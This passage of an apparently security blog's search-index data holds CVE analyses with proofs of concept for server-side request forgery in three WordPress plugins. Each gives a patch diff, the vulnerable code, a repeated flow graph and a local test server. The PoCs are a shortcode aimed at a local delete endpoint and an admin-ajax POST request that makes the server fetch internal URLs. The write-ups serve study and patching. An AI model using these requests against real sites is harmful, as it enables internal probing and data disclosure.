Required Privilege: Contributor Product: WordPress Embed Any Document Plugin ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed Any Document: 2.7.5 (vulnerable) and 2.7.6 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between versions. ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff awsm-embed.php - v2.7.5 public function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } In the vulnerable version, embed_shortcode() performs an HTTP HEAD request using wp_remote_head() with the url value taken directly from $shortcode_atts['url']. Because there is no validation, filtering, or scope limitation for the URL, an attacker can supply an arbitrary URL — leading to requests being sent to local services and causing SSRF. awsm-embed.php - v2.7.6 public function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_safe_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } The patch replaces wp_remote_head() with wp_safe_remote_head(), which adds safety checks to prevent access to internal/private/loopback/link-local addresses, thereby mitigating SSRF risk. ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code To reach the wp_remote_head( $shortcode_atts['url'] ) call in embed_shortcode(), an attacker must bypass the following checks: url must be set and not empty if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) $show must be set to true before entering the HEAD call $show defaults to false. It becomes true only when if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) returns true and one of the following is satisfied: if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } download equals 'alluser' or 'all'. download equals 'logged' and is_user_logged_in() returns true (i.e., the user is logged in). public function allowdownload( $provider ) { $blacklist = array( 'drive', 'box' ); if ( in_array( $provider, $blacklist, true ) ) { return false; } else { return true; } } allowdownload() returns true if the $provider ($shortcode_atts['viewer']) is not present in the $blacklist. Bug Because the SSRF is performed via HTTP HEAD, the response body is not returned, but metadata (Content-Type, Content-Length) can still be disclosed and internal endpoints can be probed. If an endpoint does not distinguish by HTTP method, state-changing actions may be triggered. embed_shortcode() is registered as the shortcode callback: add_shortcode( 'embeddoc', array( $this, 'embed_shortcode' ) ); ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"] B --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"} C -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"} C -- No --\u003e End1[No request] D -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"} D -- No --\u003e End2[No request] E -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"] E -- No --\u003e End3[No request] F --\u003e G[\"Return to client\"] graph TD A[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"] B --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"} C -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"} C -- No --\u003e End1[No request] D -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"} D -- No --\u003e End2[No request] E -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"] E -- No --\u003e End3[No request] F --\u003e G[\"Return to client\"] graph TD A[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"] B --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"} C -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"} C -- No --\u003e End1[No request] D -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"} D -- No --\u003e End2[No request] E -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"] E -- No --\u003e End3[No request] F --\u003e G[\"Return to client\"] graph TD A[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"] B --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"} C -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"} C -- No --\u003e End1[No request] D -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"} D -- No --\u003e End2[No request] E -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"] E -- No --\u003e End3[No request] F --\u003e G[\"Return to client\"] ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server Create a simple local service in Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/delete') def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Log in with a Contributor account Create a post with the shortcode [embeddoc url=http://localhost:8001/delete?id=1 download=all] Result: HEAD request to local service ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-1043 is an SSRF due to the plugin calling wp_remote_head() with a URL from the shortcode without validation. Although the request is a HEAD (no body), it can still disclose metadata and probe internal services or, via redirects or method-agnostic endpoints, cause state changes. The patch (v2.7.6) uses esc_url_raw() + wp_safe_remote_head() to mitigate the risk. ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Cause: missing filtering/whitelist of URLs before making server-side HTTP calls. Impact: metadata leak, internal discovery, possible chaining (redirect → GET, method-agnostic endpoints). Fix: update to v2.7.6. Short recommendations: use wp_safe_remote_*, esc_url_raw()/whitelist, disable redirects when only headers are needed, and limit user privileges. ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References SSRF (Server Side Request Forgery) — Hacktrick WordPress Embed Any Document Plugin \u003c= 2.7.5 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin.","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info A Server-Side Request Forgery (SSRF) vulnerability in the BoldGrid Post and Page Builder by BoldGrid – Visual Drag and Drop Editor plugin allows an attacker to perform forged requests from the server. This issue affects the Post and Page Builder by BoldGrid – Visual Drag and Drop Editor plugin from an unknown version up to 1.27.8. CVE ID: CVE-2025-52713 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.27.8 Patched Versions: 1.27.9 CVSS severity: Low (6.4) Required Privilege: Contributor Product: WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Post and Page Builder by BoldGrid – Visual Drag and Drop Editor: 1.27.8 (vulnerable) and 1.27.9 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff class-boldgrid-editor-ajax.php - v1.27.8 public function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_remote_head( $url ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } In the vulnerable version, get_redirect_url() reads an array of URLs from $_POST['urls'], then iterates each element and issues a request via wp_remote_head($url) without validating or sanitizing the input. This allows an attacker to supply arbitrary URLs so the server will request internal addresses like 127.0.0.1 or 169.254.169.254, leading to SSRF. Also, because there are no timeout or redirection limits, the function can be abused to cause hangs or denial-of-service (DoS). class-boldgrid-editor-ajax.php - v1.27.9 public function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_safe_remote_head( esc_url_raw( $url ), array( 'timeout' =\u003e 5, 'redirection' =\u003e 5, ) ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } The patch replaces wp_remote_head() with wp_safe_remote_head() together with esc_url_raw() to sanitize and allow only valid URLs, and adds protective parameters timeout =\u003e 5 and redirection =\u003e 5. This prevents requests to internal/loopback addresses and reduces performance-related risks. ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code The call self::validate_nonce( 'image' ); is used to verify a nonce — WordPress’s mechanism to prevent CSRF (Cross-Site Request Forgery). class-boldgrid-editor-ajax.php - v1.27.8 public static function validate_nonce( $name ) { $nonce = ! empty( $_POST[ self::$nonces[ $name ] ] ) ? $_POST[ self::$nonces[ $name ] ] : null; $valid = wp_verify_nonce( $nonce, self::$nonces[ $name ] ); if ( ! $valid ) { status_header( 401 ); wp_send_json_error(); } } The plugin defines a static $nonces array that maps actions to nonce keys: class-boldgrid-editor-ajax.php - v1.27.8 protected static $nonces = array( 'image' =\u003e 'boldgrid_gridblock_image_ajax_nonce', 'setup' =\u003e 'boldgrid_editor_setup', 'gridblock_save' =\u003e 'boldgrid_editor_gridblock_save', ); When validate_nonce('image') is called, it: Reads the nonce value from POST using the key boldgrid_gridblock_image_ajax_nonce. Verifies it via wp_verify_nonce(). If invalid, returns HTTP 401 Unauthorized and halts processing with wp_send_json_error(). Tip When searching for boldgrid_gridblock_image_ajax_nonce in the plugin source, we find it is assigned from the JavaScript variable BoldgridEditor.grid_block_nonce. Nonce value in JS Because this AJAX request is sent from the client, you can obtain the current nonce by opening the browser Console and calling: BoldgridEditor.grid_block_nonce when creating a post with this plugin. Nonce value in console get_redirect_url() is registered as a callback for the action hook: add_action( 'wp_ajax_boldgrid_redirect_url', array( $boldgrid_editor_ajax, 'get_redirect_url' ) ); This means when a client sends an AJAX request to /wp-admin/admin-ajax.php?action=boldgrid_redirect_url, get_redirect_url() will be invoked. ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"] B --\u003e C[\"self::validate_nonce('image')\"] C --\u003e D[\"read $_POST['urls']\"] D --\u003e E[\"foreach $url\"] E --\u003e F[\"wp_remote_head($url) ← SSRF sink\"] F --\u003e G[\"extract headers['location'] → $redirectUrls\"] G --\u003e H{\"$redirectUrls not empty?\"} H -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"] H -- No --\u003e J[\"wp_send_json_error()\"] graph TD A[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"] B --\u003e C[\"self::validate_nonce('image')\"] C --\u003e D[\"read $_POST['urls']\"] D --\u003e E[\"foreach $url\"] E --\u003e F[\"wp_remote_head($url) ← SSRF sink\"] F --\u003e G[\"extract headers['location'] → $redirectUrls\"] G --\u003e H{\"$redirectUrls not empty?\"} H -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"] H -- No --\u003e J[\"wp_send_json_error()\"] graph TD A[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"] B --\u003e C[\"self::validate_nonce('image')\"] C --\u003e D[\"read $_POST['urls']\"] D --\u003e E[\"foreach $url\"] E --\u003e F[\"wp_remote_head($url) ← SSRF sink\"] F --\u003e G[\"extract headers['location'] → $redirectUrls\"] G --\u003e H{\"$redirectUrls not empty?\"} H -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"] H -- No --\u003e J[\"wp_send_json_error()\"] graph TD A[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"] B --\u003e C[\"self::validate_nonce('image')\"] C --\u003e D[\"read $_POST['urls']\"] D --\u003e E[\"foreach $url\"] E --\u003e F[\"wp_remote_head($url) ← SSRF sink\"] F --\u003e G[\"extract headers['location'] → $redirectUrls\"] G --\u003e H{\"$redirectUrls not empty?\"} H -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"] H -- No --\u003e J[\"wp_send_json_error()\"] ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server Create a simple local service with Python: from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a POST request with the URL pointing to the local service: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C07a62e731a6142aa7b15555fdd5e1cbdd114cffb4a041ba0ecd9394c8319bb3f; wp-settings-time-2=1761643645; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C450b8e4bb8ebb335d435b94645ae098cee383a09a6e129efbdec8a2348deeda0 ... action=boldgrid_redirect_url\u0026urls[0]=http://localhost:8001/metadata\u0026boldgrid_gridblock_image_ajax_nonce=482dbb1ed2 Result: Content read from local service ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability CVE-2025-52713 stems from get_redirect_url() in the BoldGrid Post and Page Builder plugin (≤ 1.27.8) issuing HTTP requests to user-supplied URLs without validation or restrictions, resulting in SSRF. An attacker with Contributor privileges and a valid nonce can force the server to request internal addresses. The patch (1.27.9) fixes this by using esc_url_raw() and wp_safe_remote_head() with timeout and redirection limits to prevent unsafe requests. ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Cause: missing validation and sanitization of user-provided URLs. Nonce only protects against CSRF, not SSRF. Impact: Low (6.4) but may lead to internal data disclosure. Update to v1.27.9 to remediate. Development best practice: always use safe APIs (wp_safe_remote_*) and sanitize URLs with esc_url_raw(). ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References SSRF (Server Side Request Forgery) — Hacktrick WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin \u003c= 1.27.8 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress ZoloBlocks Plugin.","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info A Server-Side Request Forgery (SSRF) vulnerability in BdThemes ZoloBlocks allows an attacker to make forged requests from the server. This issue affects ZoloBlocks versions from an unspecified initial version up to 2.3.11. CVE ID: CVE-2025-60161 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.3.11 Patched Versions: 2.3.12 CVSS severity: Low (5.4) Required Privilege: Unauthenticated Product: WordPress ZoloBlocks Plugin ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - ZoloBlocks: 2.3.11 (vulnerable) and 2.3.12 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff The vulnerability existed in the file TemplatesV1.php, however this file was removed in the patched release. TemplatesV1.php was removed in the patch ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code TemplatesV1.php - v2.3.11 public function demo_import() { // Check input parameter from POST if (!isset($_POST['json_file_url'])) { wp_send_json_error('No JSON file URL provided'); return; } // Retrieve and sanitize the user-provided URL $json_file_url = sanitize_text_field(wp_unslash($_POST['json_file_url'])); // Send an HTTP request to that URL $response = wp_remote_get($json_file_url, ['timeout' =\u003e 30]); // If there's an error when fetching data, return a JSON error if (is_wp_error($response)) { wp_send_json_error('Failed to fetch JSON data'); return; } // Retrieve the response body and decode the JSON $body = wp_remote_retrieve_body($response); $data = json_decode($body, true); $content = $data['content'] ?? ''; // Return a successful JSON response including the imported content wp_send_json_success([ 'status' =\u003e 'success', 'message' =\u003e __('Pattern imported successfully!', 'zoloblocks'), 'content' =\u003e $content, ]); } Bug The demo_import() function accepts a URL from the user → issues an HTTP request (wp_remote_get) to fetch JSON → decodes it and returns the result via wp_send_json_success(). Because it does not validate or restrict the URL, it can be abused to cause SSRF. The demo_import() function is registered as a callback for an action hook: add_action('wp_ajax_nopriv_zolo_demo_import', [$this, 'demo_import']); This means: The wp_ajax_nopriv_ hook is used for unauthenticated users (anonymous users). When a client sends an AJAX request to the endpoint admin-ajax.php?action=zolo_demo_import, WordPress will invoke the demo_import() function. ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) → extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) → extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) → extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) → extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server Create a simple local service using Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) 